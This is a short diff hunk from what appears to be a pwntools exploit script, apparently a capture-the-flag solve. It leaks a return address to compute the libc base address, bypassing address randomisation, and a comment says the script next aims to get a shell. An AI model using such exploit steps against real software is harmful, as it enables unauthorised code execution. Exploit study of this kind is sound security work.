@@ -35,6 +35,7 @@ def main():
     # get base address of libc
     start_call_main_addr = unpack(r.recvuntil(b'\n', drop=True), "all")
     libc.address = start_call_main_addr - (libc.sym["__libc_start_call_main"] + 122)
+    # libc.address = start_call_main_addr - (libc.libc_start_main_return)
     r.success(f"leaked {libc.address=:x}")
 
     # make sure we get a shell
